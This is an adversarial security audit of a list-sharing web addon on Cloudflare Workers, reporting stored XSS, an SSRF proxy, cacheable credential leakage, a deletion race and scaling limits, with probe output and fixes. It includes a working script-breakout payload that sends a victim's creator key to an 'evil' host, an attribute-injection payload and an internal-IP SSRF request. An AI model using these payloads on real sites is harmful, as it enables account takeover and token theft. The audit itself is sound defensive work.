# My Lists Addon — Adversarial Audit III

**Date:** 2026-09-08
**Baseline commit:** `932da34` (`main`), tree clean, `bash verify.sh` green before and after.
**Method:** static analysis of all 27 sources + the generated Worker, plus **live execution** —
the real `worker_entry_combined.js` export driven through the repo's own in-memory KV/D1
harness, the client bundle driven through `tests/client-harness.mjs`, and two findings
reproduced end-to-end in **real Chromium** against the Worker served over HTTP.
**Executable probes:** [`audit/adversarial-III-2026-09-08/`](./audit/adversarial-III-2026-09-08/)
— every claim below names the probe that produced it.

---

# Executive Summary

## Security posture — **not safe to keep serving shared list links as-is**

The headline is a **critical, browser-verified stored XSS that leads to full account
takeover, reachable with no account at all**. The server renders `SERVER_DEEP_LINK_LIST`,
`serverEntries` and the OAuth tokens into an inline `<script>` with `JSON.stringify`, which
does not neutralise `</script>`. Four independent, attacker-controllable values reach that
sink, plus four unescaped `value="${…}"` HTML attributes. I proved it in Chromium: an
anonymous `POST /api/publish-list` whose list *name* carries `</script><script>…</script>`
produces a shareable URL that, when a signed-in visitor opens it, reads their Creator Key out
of `localStorage`. `document.title` came back as `PWNED:MYL-VICT-IMSK-EY01`.

The previous frontend audit recorded the opposite conclusion — *"Hostile payloads through
published-list names/descriptions/creator names … all inert"* (AUDIT-2026-09-07-FRONTEND,
line 1245) — because it tested the **client-side** render path and never the **server-rendered
preamble**. The 2026-09-05 audit likewise recorded *"No XSS."* Both are falsified.

Three more security findings sit behind it: an unauthenticated, unrate-limited SSRF / open
request proxy on `/api/resolve`; the same endpoint handing out another account's MDBList API
key and Trakt/MDBList OAuth access tokens **with `Cache-Control: max-age=3600` on a GET**;
and an easily-hit deletion race that leaves a deleted account's list permanently public with
nobody able to remove it.

## Reliability posture — one route is 100 % broken, two features are silently dead

Scope analysis of the whole 62,206-line Worker found exactly **two unbound identifiers**, and
both are live defects:

* `isShow` → **`/lists/curated/:slug` returns HTTP 500 on every single request.** The client's
  own `getListCleanPath()` pushes that URL into the address bar for all seven built-in
  "Curated: …" lists, so reloading or sharing one lands on an error.
* `clientId` → the Trakt OAuth callback's `/users/me` lookup throws before `fetch` is called,
  so a browser Trakt login **never** learns the user's Trakt username.

The same class in the client bundle: `listName` at `18_client-copy-and-trakt-export.js:232`
is out of scope, so `trackEvent('list-copy', …)` — the **only** producer of `list-copy` events
in the app — throws into a bare `catch` every time. The `stats:list_copy:` namespace a previous
audit carefully rewired to be *readable* has never received a single write.

## Scalability posture — the documented deployment target cannot run this app

README.md:17 says *"self-host on your own free Cloudflare Worker."* Against the limits I
fetched from Cloudflare's docs today (Free: **10 ms CPU**, **50 subrequests/invocation**,
**1,000 KV writes/day**, **1 write/second to the same key**):

| Measured | Free-plan limit |
|---|---|
| `POST /api/bulk-resolve` at its own documented max (200 titles) → **400 outbound fetches** | 50 |
| `POST /api/details/batch` (60-id cap) → **180 outbound fetches** | 50 |
| one cron tick, 30 accounts → **186 outbound fetches** | 50 |
| one PBKDF2 creator-key verification → **17.6 ms CPU** | 10 ms |
| one page view with D1 unbound → **2 KV writes** (⇒ ~500 page views exhausts the day) | 1,000/day |
| every page view writes `stats:pageviews:total` | 1 write/s/key |

`00_constants.js:75` sizes its budgets against *"Cloudflare's 1,000-subrequest-per-invocation
limit"* — which is the **paid** number (now 10,000), not the free one.

And one hard wall on **any** plan: `/api/creator/lists` issues one KV read per list with no
cap. At **990 lists it crosses Cloudflare's 1,000-KV-operations-per-invocation limit**
(measured: 1,001 ops) and the dashboard stops loading permanently — with no way to delete
lists, because deleting them needs the dashboard.

## Biggest risks, in order

1. Stored/reflected XSS → Creator Key and provider OAuth token theft (**CRITICAL**).
2. `/api/resolve` leaking cacheable provider credentials, and acting as an open proxy (**HIGH** ×2).
3. Deleted accounts leaving permanently-public, unremovable lists (**HIGH**).
4. `/lists/curated/:slug` dead for every visitor (**HIGH**).
5. `/api/creator/lists` hitting a hard Cloudflare cap at 990 lists (**HIGH**).

## What I checked and found clean

Stated as results, not reassurance:

* **Authorization.** I drove all 19 creator routes with (a) no credentials, (b) a wrong key,
  (c) **another creator's valid key**, and all 22 admin routes with no cookie / a forged
  signature / an expired cookie. **Every one answered 401.** No IDOR, no BOLA, no
  cross-account mutation. (`p05_authmatrix.mjs`, `p06_adminmatrix.mjs`)
* **KV pagination.** 21 `.list()` sites; 2 are wrapper definitions, 13 of the remaining 19
  paginate with a cursor, and the 6 that do not are each a documented bounded fallback or a
  deliberate per-account slice. **No "one page is the whole dataset" bug survives.**
* **Fuzzing.** 112 literal routes × 9 hostile payload shapes + 6 query-string abuses ≈ 1,700
  requests. **Exactly one uncaught 5xx** outside "provider not configured" responses. No
  prototype pollution (`Object.prototype` untouched). (`p07_fuzz.mjs`, `p08_pathfuzz.mjs`)
* **Concurrency.** 20 parallel list saves → 20 records, 20 order entries, 20 D1 rows, no
  duplicates. 20 parallel likes from 20 identities → exactly 20. 10 parallel tracking pushes
  → all 10 items retained. (`p25_race.mjs`)
* **Public-index rebuild vs. privacy.** Making a list private *through the API* mid-rebuild
  does **not** republish it; the removal tombstone works. (`p28_rebuild_privacy.mjs`)
* **Admin XSS.** Hostile list names, display names, feedback and search queries rendered into
  `/admin`: all escaped, no breakout. (`p18_admin_xss` — merged into the XSS probes)
* **Documentation.** All 11 external README links resolve; every env var the code reads is
  documented and every documented one is read.

---

# Test / Execution Summary

| Step | Command | Result |
|---|---|---|
| Build | `python3 build.py` | reproduces the committed Worker byte-for-byte (2,983,673 B; 750,122 B gzipped) |
| Drift | `python3 check_sync.py` | ok |
| Syntax | `node --check worker_entry_combined.js` | ok |
| Page render | `node render_check.js` + `html_checks.py` | ok (1,790,358 chars, 7 script blocks) |
| Admin render | `… --admin` | ok |
| Service worker | `… --sw` + `node --check` | ok |
| Function map | `python3 gen_map.py` | no drift |
| Tests | `node --test tests/*.test.mjs` | **356 pass, 0 fail, 1 skip** (131 s) |
| Whole suite | `bash verify.sh` | ALL CHECKS PASSED (2 m 12 s) |
| Scope analysis (new) | `acorn` + `eslint-scope` over the combined Worker | **2 unbound identifiers**, both live bugs |
| Scope analysis (new) | same over the rendered client bundle | 115 candidates → 114 are inline-handler targets, 1 dead function |
| Live route sweep (new) | ~1,700 requests through the real Worker export | 1 uncaught 5xx |
| Real browser (new) | Chromium 1194 via Playwright, Worker served over HTTP | XSS executed, Creator Key exfiltrated |
| Cloudflare limits | fetched `developers.cloudflare.com/workers/platform/limits/` and `/kv/platform/limits/` | quoted inline |

**Not verified — reasons stated:**
* Real Cloudflare KV eventual consistency, real edge cache behaviour, and real per-plan CPU
  enforcement. The harness is an in-memory KV with a faithful cursor model but no propagation
  delay and no CPU metering. **NOT VERIFIED — no Cloudflare account available in this session.**
* Absolute CPU numbers are from this container's CPU. The *ratio* (PBKDF2 ≫ 10 ms) is
  hardware-independent; the exact millisecond figure is not.
* Live provider APIs (TMDB/Trakt/Simkl/MDBList) were stubbed. Response-shape handling was
  exercised against stubs, not the real services.

---

# CRITICAL Findings

## [CRITICAL] Stored and reflected XSS: user data breaks out of the inline `<script>` preamble

**Category:** XSS / Authentication
**Confidence:** Confirmed (executed in Chromium)
**File:** `16_client-row-core.js:34, 39–42, 49`; `15_tab-settings-html.js:173, 203, 206, 235, 263`
**Function:** `renderBuilder()` (`09_page-shell.js`) and its template fragments
**Affected routes:** `GET /lists/:user/:slug`, `GET /lists/user/:slug`, `GET /:config/configure`,
`GET /:config/manifest.json` (browser navigation → 302 → configure)

### Description

`renderBuilder()` emits a per-request inline preamble:

```js
const SERVER_DEEP_LINK_LIST = ${JSON.stringify(deepLinkList)};
let traktAccessToken       = ${JSON.stringify(initialTraktAccessToken)};
let mdblistAccessToken     = ${JSON.stringify(initialMdblistAccessToken)};
const serverEntries        = (${initialEntriesJson});
```

`JSON.stringify` escapes `"` and `\`, but **not `</script>`**. The HTML tokenizer ends a
script element at the first `</script` sequence regardless of JavaScript string context, so any
attacker-controlled value containing `</script>` closes the block early and everything after it
is parsed as HTML.

Separately, five settings inputs interpolate straight into an HTML attribute with no escaping
at all: `value="${initialTmdbKey}"`, `${initialTraktKey}`, `${initialTraktUsername}`,
`${initialMdblistKey}`, `${initialSimklKey}`. A `"` in any of them ends the attribute.

The codebase already owns the right tools — `escapeHtmlServer()` (`02_…:721`) and the
client's `escapeJsAttr` — and neither is applied here.

### Why It Matters

The page's `localStorage` holds `myListAddon:creatorKey` (the entire Creator Profile
credential — there is no session, so the key *is* the account), plus
`myListAddon:traktAccessToken`, `:mdblistAccessToken`, `:simklAccessToken` and every provider
API key. The CSP is `script-src 'self' 'unsafe-inline'` (deliberate — the UI is built on inline
handlers), so injected inline script and `onerror=`/`onload=` attributes both execute;
`connect-src 'self' https:` and `img-src 'self' https: data:` permit exfiltration to any host.

One click on a shared list link is full account takeover plus theft of the victim's Trakt,
MDBList, TMDB and Simkl credentials.

### Attack / Failure Scenario

**Vector A — stored, no account required.** `POST /api/publish-list` is unauthenticated and has
no UI caller at all:

```
POST /api/publish-list
{"name":"Top 10 Free Movies </script><script>fetch('https://evil/'+localStorage.getItem('myListAddon:creatorKey'))</script>",
 "type":"movie","visibility":"public","items":[{"id":"tt0111161","title":"…"}]}
→ {"ok":true,"listName":"top-10-free-movies-script-script-…","url":"https://host/lists/user/…"}
```

The list is immediately advertised in `/lists/public.json`, `/api/public-lists.json` and the
in-app community search, so it does not even have to be sent to a victim directly.

**Vector B — stored, creator account.** `/api/creator/lists/save`: the list `name`, every
`items[].title`, every `items[].poster`, and the account's `displayName` all reach the same
sink on `/lists/<user>/<slug>`.

**Vector C — reflected, no account, one link.** `POST /api/save` (unauthenticated, 10/min/IP)
stores a config and returns a **short 12-character id**. `https://host/<id>/configure` — a
short, innocuous-looking URL — renders `traktAccessToken` / `mdblistAccessToken` straight into
the script block, and `tmdbKey` / `traktKey` / `traktUsername` / `mdblistKey` into HTML
attributes. `https://host/<id>/manifest.json` opened in a browser 302s to the same page. That
is *exactly* the link shape the product tells users to copy and paste around.

### Proof / Evidence

`audit/adversarial-III-2026-09-08/p13_browser_xss.mjs` — Worker served over HTTP, real Chromium:

```
published: { ok: true, listName: 'top-10-free-movies-script-script-window-xss-ran-1-document-t' }
attacker script executed in the victim's browser: true
document.title after payload           : PWNED:MYL-VICT-IMSK-EY01
```

`p14_browser_xss2.mjs` — the install-link variant, same browser:

```
A. /<config>/configure  ran: true | title: PWNED2:MYL-VICT-IMSK-EY01
B. /<config>/manifest.json (browser nav -> 302 to configure)
   ran: true | title: PWNED2:MYL-VICT-IMSK-EY01
```

`p12_xss_final.mjs` — sink inventory (payload chosen to contain no `"`, so `JSON.stringify`
alters not one byte of it):

```
== A. /{config}/configure ==
   traktAccessToken     BREAKOUT
   mdblistAccessToken   BREAKOUT
   tmdbKey              BREAKOUT
   mdblistKey           BREAKOUT
   traktKey             BREAKOUT
   traktUsername        BREAKOUT
== B. anonymous publish -> shared page ==
   status 200 name: BREAKOUT  item title: BREAKOUT  poster: BREAKOUT
== C. creator list + display name ==
   status 200  listName: BREAKOUT  itemName: BREAKOUT  displayName: BREAKOUT
```

`p16_attr.mjs` — the attribute half, payload `x" autofocus onfocus="…`:

```
traktKey           ATTRIBUTE BREAKOUT
tmdbKey            ATTRIBUTE BREAKOUT
mdblistKey         ATTRIBUTE BREAKOUT
traktUsername      ATTRIBUTE BREAKOUT
```

`p17_entries.mjs` — `serverEntries`, via both config forms:

```
A base64 entries[].name breakout: true
B short-id entries[].name breakout: true
    "const serverEntries = ([{\"name\":\"ZZ</script><svg onload=1>YY\",\"url\":\"tmdb:chart:popular\"…"
```

### Recommended Fix

Two small changes, no redesign:

1. **A JSON-into-script serialiser.** Replace every `${JSON.stringify(x)}` inside a `<script>`
   with a helper that additionally escapes the three sequences an HTML parser reacts to:
   ```js
   function jsonForScript(v) {
     return JSON.stringify(v)
       .replace(/</g, "\\u003c").replace(/>/g, "\\u003e")
       .replace(/\u2028/g, "\\u2028").replace(/\u2029/g, "\\u2029");
   }
   ```
   Apply at `16_client-row-core.js:34, 39, 40, 41, 42` and to `initialEntriesJson`
   (`09_page-shell.js:79`). `\u003c` is valid JSON-string syntax, so the parsed value is
   unchanged — nothing downstream needs touching.
2. **Escape the five attributes.** Wrap `initialTmdbKey`, `initialTraktKey`,
   `initialTraktUsername`, `initialMdblistKey`, `initialSimklKey` in the existing
   `escapeHtmlServer()` at their `value="…"` sites in `15_tab-settings-html.js`.

Defence in depth, worth adding but **not** a substitute: reject `<` in list names and display
names at the write endpoints.

### Regression Risk

Low, and testable. `\u003c` inside a JSON string decodes to `<`, so `SERVER_DEEP_LINK_LIST`,
`serverEntries` and the tokens hold identical values after the fix — only the bytes on the
wire change. The one thing to get right is applying it to **every** `${JSON.stringify(…)}`
inside a script element rather than only `deepLinkList`; there are six.
Add a `html_checks.py` assertion that no rendered `<script>` body contains the literal
`</script` after a hostile render, so this cannot regress silently — that check is what was
missing, and it is why two prior audits declared this area clean.

### Related Findings

Same class, already fixed elsewhere and worth reading for the reasoning:
`19_client-search-and-likes.js:154` (`escapeAttr` is wrong for a JS string inside an
attribute), and AUDIT-2026-09-07-FRONTEND FE-02. The escaping discipline exists in this
codebase — it simply was never applied to the server-rendered preamble.

---

# HIGH Findings

## [HIGH] `/lists/curated/:slug` returns HTTP 500 on every request

**Category:** Reliability / Dead route
**Confidence:** Confirmed (executed)
**File:** `25_api-catalog-routes.js:485`
**Function:** `handleFetch()`
**Affected route:** `GET /lists/curated/<slug>`

### Description

```js
m = path.match(/^\/lists\/curated\/([A-Za-z0-9-]+)$/);
if (m) {
  const slug = m[1];
  const title = isShow ? "Recommended Shows" : "Recommended Movies";   // isShow is unbound
```

`isShow` is declared nowhere in the module. Scope analysis over the whole 62,206-line combined
Worker reports it and `clientId` as the only two unresolved identifiers. It throws a
`ReferenceError` out of `handleFetch`, which the top-level boundary converts into
`{"ok":false,"error":"isShow is not defined"}` at HTTP 500.

### Why It Matters

`getListCleanPath()` (`16_client-row-core.js:211`) maps every `custom:curated:*` list to
`/lists/curated/<slug>` and `openListDetailsPage()` `pushState`s it. So opening any of the seven
built-in curated shelves — *Recommended Movies*, *Recommended Shows*, *Hidden Gems*,
*Top Rated Classics*, *Cult Favorites*, *Binge-Worthy Series*, *Award Winners* — puts a URL in
the address bar that 500s on reload, on Back after a full navigation, and for anyone the link
is shared with. It also echoes an internal identifier name to the caller.

### Attack / Failure Scenario

Not an attack: a user opens *Curated: Hidden Gems*, copies the URL from the address bar, sends
it to a friend, and the friend gets a JSON error. The user reloads their own tab and gets the
same. Multi-segment paths like `/lists/curated/a/b` fall past this regex to the catch-all at
line 514 and work, which is why casual testing misses it.

### Proof / Evidence

`p03_curated.mjs`:

```
/lists/curated/action  -> 500 {"ok":false,"error":"isShow is not defined"}
/lists/curated/for-you -> 500 {"ok":false,"error":"isShow is not defined"}
/lists/curated/a       -> 500 {"ok":false,"error":"isShow is not defined"}
/lists/trending        -> 200 <!DOCTYPE html>            (working sibling, for contrast)
```

Stack from the harness: `at handleFetch (worker_entry_combined.js:51188:21)`.

### Recommended Fix

Derive the flag from the slug, matching the two `custom:curated:` names the client actually
mints:

```js
const slug = m[1];
const isShow = /show|series/i.test(slug);
```

### Regression Risk

Minimal — the branch has never executed successfully, so there is no behaviour to preserve.
The only judgement call is which slugs count as "shows"; getting it wrong picks the wrong page
title, not the wrong list (the `custom:curated:` URL passed to `deepLinkList` is built from the
slug either way).

### Related Findings

Same root cause as the Trakt-OAuth `clientId` bug below: **a concatenated single-scope bundle
with no scope linting.** Both would be caught by one `no-undef` pass in CI.

---

## [HIGH] `/api/resolve` is an unauthenticated, unrate-limited SSRF / open request proxy

**Category:** SSRF
**Confidence:** Confirmed (executed)
**File:** `25_api-catalog-routes.js:5591–5601`
**Function:** `handleFetch()`
**Affected route:** `GET /api/resolve?config=…&url=…`

### Description

```js
const rawUrl = url.searchParams.get("url") || "";
…
if (rawUrl && /^https?:\/\//i.test(rawUrl)) {
  const u = new URL(rawUrl);
  const remoteResolveUrl = `${u.origin}/api/resolve?config=${encodeURIComponent(config)}`;
  const remoteRes = await fetch(remoteResolveUrl);
  if (remoteRes.ok) {
    const remoteData = await remoteRes.json();
    if (remoteData && remoteData.ok && Array.isArray(remoteData.entries) && remoteData.entries.length) {
      return json(remoteData);            // attacker-controlled content, echoed back
    }
  }
}
```

The host, port and scheme come entirely from the query string. There is **no allowlist and no
rate limit**. The sibling endpoint with the same shape, `/api/preview`, was hardened in a
previous round with exactly both (`isAllowedCatalogSourceUrl` + an 80/min IP bucket) — this one
was missed.

### Why It Matters

* **Off Cloudflare** (the README documents self-hosting, and round-5 item G already notes that
  self-hosters outside Cloudflare get no real per-client limit): loopback and RFC1918 are
  reachable, so this is a classic internal-network SSRF.
* **On Cloudflare**: loopback and private ranges are not routable from the edge, but the
  endpoint is still an **unauthenticated, unbounded outbound-request generator** aimed at any
  public host — a reflection/amplification primitive that burns the deployment's own
  subrequest budget and billing and puts the owner's egress reputation behind someone else's
  traffic.
* The remote body is **returned to the caller** whenever it is JSON with `ok:true` and a
  non-empty `entries` array, which makes it a content-injection channel into the app's own
  "import from an existing link" flow as well as a response oracle.

### Attack / Failure Scenario

`GET /api/resolve?config=<any>&url=http://10.0.0.5:8080/` from anywhere, as fast as the
attacker likes. On a self-hosted deployment that enumerates the internal network; on
Cloudflare it turns the Worker into a free request cannon.

### Proof / Evidence

`p20_ssrf.mjs` stands up a local HTTP listener and points the Worker at it:

```
internal 'service' listening on 127.0.0.1:40775
200 http://127.0.0.1:40775/anything  {"ok":true,"entries":[{"…","name":"INJECTED FROM INTERNAL HOST"}]}
200 http://localhost:40775/          {"ok":true,"entries":[{"…","name":"INJECTED FROM INTERNAL HOST"}]}
--- requests the Worker actually made to the internal host ---
[ { url: '/api/resolve?config=…', headers: { host: '127.0.0.1:40775' } },
  { url: '/api/resolve?config=…', headers: { host: 'localhost:40775' } } ]
25 rapid SSRF calls from one IP -> 200s: 25   internal hits total: 27
```

Note the last line: **no rate limit at all.**

### Recommended Fix

The legitimate use is one deployment resolving a link that came from a sibling deployment, so
the fix is small:

1. Require `u.protocol === "https:"`.
2. Reject anything whose hostname is not a public DNS name — at minimum block `localhost`,
   `*.localhost`, bare IP literals (v4 and v6), and `.internal`/`.local` suffixes.
3. Add the same per-IP bucket `/api/preview` uses (`consumeRateLimit(env, ctx, "resolve", ip, …)`).

### Regression Risk

The client only ever passes `url` when the pasted link carried an explicit origin
(`24_client-backup-restore-presets.js:686`), and step 1 of that same function already tries the
remote origin directly from the browser first — so restricting the server-side fallback to
public https hosts costs nothing a real user does.

### Related Findings

`/api/preview` (round 5, item F) is the same class, already fixed. Worth grepping for a third:
every `fetch()` whose target host can be influenced by request data. I enumerated all of them
(`p23` methodology) — `/api/resolve` is the only remaining one; every other outbound target is
rewritten onto a fixed provider host before the fetch.

---

## [HIGH] `/api/resolve` returns another account's provider credentials with `Cache-Control: max-age=3600`

**Category:** Token leakage / Cache
**Confidence:** Confirmed (executed)
**File:** `25_api-catalog-routes.js:5606–5617`, `02_http-and-creator-utils.js:48` (`isPrivateApiPath`)
**Affected route:** `GET /api/resolve?config=<install-id>`

### Description

`/api/resolve` returns, unauthenticated, to anyone holding an install id:

```json
{"ok":true,"entries":[…],
 "mdblistKey":"MDBLIST-SECRET-123","mdblistAccessToken":"MDBLIST-OAUTH-TOKEN",
 "traktKey":"TRAKT-CLIENT-ID","traktUsername":"victim","traktAccessToken":"TRAKT-OAUTH-TOKEN"}
```

It is a **GET**, and it inherits `json()`'s successful-response default of
`Cache-Control: max-age=3600`.

The codebase already understands this exact problem. `jsonPrivate()` exists for *"a response
whose BODY belongs to one account: their lists…, their synced config, **the provider API keys
inside it**"*, and `isPrivateApiPath()` force-sets `no-store` — but it matches only
`/api/creator/*` and `/admin*`. The comment on `isPrivateApiPath` even says the POST endpoints
are safe *"by accident of HTTP method rather than by design, and it stops being true the day
one of them gains a GET form."* `/api/resolve` **is** that GET form, and it was not enumerated.

### Why It Matters

I swept every per-account GET endpoint. `/api/resolve` is the **only one** that is cacheable:

```
200 max-age=3600   /api/resolve?config=<id>
200 no-store       /api/trakt-my-lists?username=…&traktKey=SECRET
200 no-store       /api/mdblist-my-lists?apikey=SECRET-MDBLIST-KEY
400 no-store       /api/tmdb-my-lists?accessToken=SECRET-TMDB
400 no-store       /api/simkl/my-lists?accessToken=SECRET-SIMKL
200 no-store       /api/feedback/threads?threadIds=abc
```

There is also no `Vary`, so any shared cache between a client and the Worker may serve one
user's OAuth tokens from a stored copy for an hour. And the sibling page that renders the same
secrets, `/<id>/configure`, sets `no-store` *precisely for this reason* — the two disagree.

### Attack / Failure Scenario

Users are told to copy the manifest link and paste it into Stremio/Nuvio/wako, and the builder
page shows it on screen for copying. That link's id is all `/api/resolve` asks for. A link in a
support-forum screenshot, a synced browser history, a shared Stremio config file, or a proxy
log yields the victim's Trakt and MDBList OAuth access tokens — full read/write access to their
Trakt account through the provider's own API, no interaction with this addon required.

### Proof / Evidence

`p31_installlink.mjs` (posts exactly what `buildConfig()` sends on "Generate install link"),
and `p34_cache.mjs` for the comparison table above.

```
install id: l5QrxnliR_8-   -> install link is /l5QrxnliR_8-/manifest.json
GET /api/resolve?config=<id>  (no auth, no rate limit) -> 200
 … "mdblistKey":"MDBLIST-SECRET-123", "mdblistAccessToken":"MDBLIST-OAUTH-TOKEN",
   "traktKey":"TRAKT-CLIENT-ID", "traktAccessToken":"TRAKT-OAUTH-TOKEN"
Cache-Control on /<id>/configure: no-store
Cache-Control on /api/resolve  : max-age=3600
```

### Recommended Fix

One line at the route: return through `jsonPrivate(...)` instead of `json(...)`.
Better, and what stops the next one: extend `isPrivateApiPath()` to name `/api/resolve`
alongside the two prefixes, since that is the single choke point the file's own comment says
exists so *"a route added later cannot forget to opt in."*

Separately worth deciding (see **[INFO] The install link is a bearer credential**): whether
`/api/resolve` should return provider tokens to an unauthenticated caller at all.

### Regression Risk

None functional — the client calls this once during "import from an existing link" and does
not depend on caching. Losing the 1-hour cache costs one KV read per import.

### Related Findings

Same class as `jsonPrivate()`'s own docstring; the fix is the one already chosen for
`/api/creator/sync/load`.

---

## [HIGH] Account deletion leaves permanently-public, unremovable lists — and reports success

**Category:** Data Integrity / Privacy / Race Condition
**Confidence:** Confirmed (executed; reproduced in **6 of 10** plain concurrent runs)
**File:** `02_http-and-creator-utils.js:2845` (`purgeCreatorData`), `26_api-creator-and-admin-routes.js:2218`
**Affected routes:** `POST /api/creator/delete-account` + any concurrent authenticated write

### Description

`authenticateCreator()` checks the deletion tombstone **once, at the start of a request**. A
write that authenticated a few milliseconds before `delete-account` wrote the tombstone runs to
completion, and its KV `put` lands *after* both of `purgeCreatorData`'s sweeps. The account
identity is gone; the list record is not.

`delete-account` then answers `{"ok":true,"cleared":{"lists":0,"keys":19}}` — `lists: 0` is
literally true of what the sweep saw, and false about what is left in the store.

### Why It Matters

A user asked for their account to be deleted. Afterwards:

* `creatorlist:<user>:<slug>` is still in KV;
* `GET /lists/<user>/<slug>.json` still serves the list's contents, **HTTP 200**;
* it is still advertised in `/lists/public.json` and `/api/search-published-lists`;
* the owner **can never remove it** — every authenticated route now answers 401 for that
  username, and the public-index rebuild keeps it because the record is genuinely `public`.

Only an admin, via `/admin/api/delete-creator-list`, can clean it up — and nothing tells them
it exists. If the username is later reclaimed, the create-time purge does catch it, so the
*inheritance* half of this was already fixed; the *continued public exposure* half was not.

### Attack / Failure Scenario

Entirely ordinary, no attacker: the builder autosaves on a 1,200 ms debounce and pushes
tracking on a 300 ms debounce. A user edits a list, then goes to Settings and confirms
"Delete account" within the debounce window. The autosave and the deletion race, and their
list stays public forever.

### Proof / Evidence

`p27_ghostnatural.mjs` — **no artificial stalling**, just two requests issued together:

```
trial 0: delete=200 save=200 publicPage=200
         stray=["creatorlist:nat0:autosaved"]  cleared={"lists":0,"keys":19}
ghost public list left behind in 6/10 plain concurrent delete+save runs
```

`p26_ghostpublic.mjs` — the full consequence, with one KV put held open across the deletion:

```
delete-account  -> 200 {"ok":true,"cleared":{"lists":0,"keys":19}}
account record gone: true
stray keys: ['creatordeleted:ghostpub','creatorlist:ghostpub:secret-favourites',
             'creatorlistorder:ghostpub','creatorliststamp:ghostpub']

GET /lists/ghostpub/secret-favourites.json -> 200 [{"title":"Private Pick",…}]
public directory -> {"ok":true,"count":1,"lists":[{"name":"Secret Favourites","creator":"ghostpub",…}]}
search           -> {"ok":true,"lists":[{"name":"Secret Favourites","username":"ghostpub",…}]}
Owner can no longer authenticate to delete it: 401
```

### Recommended Fix

Two independent changes; the second is the one that actually closes it.

1. **Re-sweep before answering.** After the existing post-identity sweep in
   `purgeCreatorData`, re-run the `creatorlist:${u}:` enumeration once. If it finds anything,
   delete it and drop those ids from the public index. Cheap (one `list()` on an account that
   is now empty) and it collapses the window to the interval between that final list and the
   response.
2. **Fail closed on read.** `/lists/:user/:slug` and the public-index rebuild should treat "the
   creator record does not exist and the username is tombstoned" as not-public. The public
   route already calls `getCreator()` for the display name (`26_…:3735`) and currently falls
   back to the raw username when it returns nothing — turning that silent fallback into a 404
   makes an ownerless list unreachable no matter how it got there.

### Regression Risk

For (2), be careful that anonymous lists (`publishedlist:user:<slug>`, `isCreatorList === false`)
have no creator record **by design** and must keep working — gate the new check on
`isCreatorList` only. Getting that wrong takes every anonymous published list offline.

### Related Findings

The 2026-09-06 adversarial round fixed the *inheritance* half of this (tombstone, double sweep,
purge-on-create) and its probe `p18_resurrect2.mjs` states the framing explicitly: *"The
question is not 'did a stray key survive' … but 'can the next owner of this username see any of
it'."* That framing is what let the public-exposure half through. Also of a piece with the
"false success" class from that same round — `cleared:{lists:0}` is a false success.

---

## [HIGH] `/api/creator/lists` crosses Cloudflare's 1,000-KV-operation invocation cap at 990 lists

**Category:** Scalability
**Confidence:** Confirmed (measured; the limit itself quoted from Cloudflare's docs)
**File:** `26_api-creator-and-admin-routes.js:1564–1776`
**Affected route:** `POST /api/creator/lists` — the creator dashboard's only data source

### Description

The route reads `creatorlistorder:{user}`, then issues **one KV `get` per list**, with no cap,
no `limit`/`offset`, and no projection — every list's full `items` array is returned. An
orphan-recovery `list()` sweep adds a few more ops.

Cloudflare's KV limits page: *"Operations/Worker invocation — 1000"* (both plans), and the
Workers limits page: *"A subrequest is any request a Worker makes using the Fetch API **or to
Cloudflare services like R2, KV, or D1**."*

### Why It Matters

Measured op counts and response sizes:

| lists | KV ops | response | wall |
|---:|---:|---:|---:|
| 10 | 19 | 0.13 MB | 24 ms |
| 100 | 109 | 1.26 MB | 37 ms |
| 500 | 509 | 6.28 MB | 140 ms |
| 980 | 991 | — | — |
| **990** | **1,001 — over the cap** | — | — |
| 1,200 | 1,210 | 15.08 MB | 258 ms |

At 990 lists the invocation is terminated. The dashboard never loads again — and because
deleting a list is done *from* the dashboard, the account is stuck with no in-app way out. The
response size is a second problem well before that: 6.3 MB at 500 lists, against a 128 MB
Worker memory budget and a mobile browser that has to parse it.

This is not hypothetical territory. AUDIT-STATUS records a real account that reached **129
list records for 22 real lists** through the duplicate-slug bug; a repeat of anything like that
walks straight into this wall.

### Attack / Failure Scenario

A heavy user (or one hit by any future duplicate-creation bug) crosses ~990 lists. Their
dashboard 500s forever. Support has no self-service remedy.

### Proof / Evidence

`p29_dashscale.mjs` (table above) and `p30_breakpoint.mjs`:

```
lists=980  kvOps=991   under
lists=990  kvOps=1001  OVER the 1,000 KV-ops-per-invocation limit
lists=1000 kvOps=1011  OVER the 1,000 KV-ops-per-invocation limit
```

### Recommended Fix

Two changes, either of which alone removes the hard wall:

1. **Page it.** Accept `limit`/`offset` (default ~200) and return a `total`, exactly as
   `/lists/public.json` already does after round 4.
2. **Stop returning `items`.** The dashboard renders name / type / count / visibility / likes;
   it does not need every list's full contents in the list view. Returning `itemCount` only
   would have cut the 1,200-list response from 15 MB to well under 1 MB.

With D1 bound, the whole thing can be one indexed query with `json_array_length(items_json)` —
the same technique already used in `computeCatalogAndCommunityLeaderboards`.

### Regression Risk

`items` is currently consumed by the client in several places (`lastCreatorListsData.find(…)`
then `.items` in `19_client-search-and-likes.js:3104`, and the merge in
`22_client-creator-profile.js`). Dropping `items` without giving those call sites a
per-list fetch would break "add to an existing mixed list". Page first, then remove `items`
behind a client update.

### Related Findings

Same root cause as **[MEDIUM] the free-plan budget mismatch** below: budgets in this codebase
are sized against a remembered "1,000 subrequests" number without distinguishing the two
different caps (KV/internal ops vs. outbound fetches) or the two plans.

---

# MEDIUM Findings

## [MEDIUM] Trakt OAuth never resolves the username — an unbound `clientId` swallowed by `catch {}`

**Category:** OAuth / Reliability
**Confidence:** Confirmed (executed)
**File:** `25_api-catalog-routes.js:2575`
**Function:** `handleFetch()`, `/api/trakt/oauth/callback`

### Description

```js
const meRes = await fetch("https://api.trakt.tv/users/me", {
  headers: { …, "trakt-api-key": clientId || TRAKT_CLIENT_ID, … },
});
```

`clientId` is not in scope here. The two `const clientId` declarations at lines 2601 and 2648
live inside the *sibling* `/api/trakt/device/code` and `/api/trakt/device/token` blocks. Evaluating
the header object throws `ReferenceError` **before `fetch` is called**, and the surrounding
`catch {}` discards it.

### Why It Matters

Every browser-based "Connect Trakt" login silently fails to learn the user's Trakt username.
The redirect omits `&trakt_username=`, `pickUpTraktTokenFromUrl()` never populates
`myListAddon:traktUsername`, and the Settings field stays blank. The **device** flow
(`/api/trakt/device/token`, line 2693–2710) does the same lookup correctly — so the two login
paths behave differently for no visible reason, which is exactly the kind of inconsistency that
gets diagnosed as "Trakt is flaky".

Impact is bounded: `runMyTraktLists()` prefers the access token and delegates to
`runMyPrivateTraktLists()`, and the server defaults to `"me"` where a username is needed
(`25_…:3214`, `:3923`). So this degrades rather than breaks — but it is a stored-config field
